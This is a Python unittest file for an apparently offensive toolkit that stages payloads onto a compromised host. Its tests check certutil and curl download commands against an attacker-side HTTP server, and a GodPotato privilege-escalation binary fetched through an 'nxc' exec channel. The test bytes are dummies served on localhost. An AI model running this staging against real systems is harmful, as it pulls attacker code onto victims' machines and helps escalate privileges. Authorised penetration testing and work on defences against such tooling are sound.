#!/usr/bin/env python3
"""Download-staging — serve an artifact and have the target fetch it over the exec
transport (the fallback when there's no --put-file path, e.g. an MSSQL-only foothold).

Pinned:

  * the fetch command is native per OS (certutil / curl);
  * download_stage actually serves the file over HTTP and the (faked) target fetches it;
  * without an lhost there is no callback, so it declines (returns None).
"""
import os
import re
import sys
import tempfile
import unittest
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from fieldkit import staging  # noqa: E402
from fieldkit.runner import RunResult  # noqa: E402


class RenderTest(unittest.TestCase):
    def test_windows_uses_certutil(self):
        cmd = staging.render_download("windows", "http://10.0.0.1:8000/x.exe", "C:\\Temp\\x.exe")
        self.assertIn("certutil", cmd)
        self.assertIn("http://10.0.0.1:8000/x.exe", cmd)

    def test_linux_uses_curl(self):
        cmd = staging.render_download("linux", "http://10.0.0.1:8000/x.so", "/tmp/x.so")
        self.assertIn("curl", cmd)
        self.assertIn("/tmp/x.so", cmd)


class DownloadStageTest(unittest.TestCase):
    def test_serves_and_target_fetches_the_artifact(self):
        d = tempfile.mkdtemp()
        local = os.path.join(d, "GodPotato.exe")
        with open(local, "wb") as fh:
            fh.write(b"POTATO-PAYLOAD-BYTES")
        got = {}

        def execute(command):
            # the "target" runs certutil — extract the URL and actually fetch it, proving
            # the HTTP serve works end to end.
            url = re.search(r'https?://[^"\s]+', command).group(0)
            got["data"] = urllib.request.urlopen(url, timeout=5).read()
            return RunResult(["nxc"], exit_code=0,
                             stdout="CertUtil: -URLCache command completed successfully.")

        res = staging.download_stage(
            {"os": "windows"}, local, "C:\\Windows\\Temp\\GodPotato.exe",
            lhost="127.0.0.1", execute=execute, bind="127.0.0.1")
        self.assertTrue(res.ok)
        self.assertEqual(got["data"], b"POTATO-PAYLOAD-BYTES")

    def test_no_lhost_declines(self):
        self.assertIsNone(staging.download_stage(
            {"os": "windows"}, "/x/y.exe", "C:\\y.exe", lhost=None, execute=lambda c: None))

    def test_server_is_stopped_after(self):
        # a second stage on the same ephemeral-port machinery must not collide/hang.
        d = tempfile.mkdtemp()
        local = os.path.join(d, "a.exe")
        open(local, "w").close()
        ports = []

        def execute(command):
            ports.append(re.search(r':(\d+)/', command).group(1))
            return RunResult(["nxc"], exit_code=0, stdout="ok")

        for _ in range(2):
            staging.download_stage({"os": "windows"}, local, "C:\\a.exe",
                                   lhost="127.0.0.1", execute=execute, bind="127.0.0.1")
        self.assertEqual(len(ports), 2)   # both completed (server started + stopped each time)


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
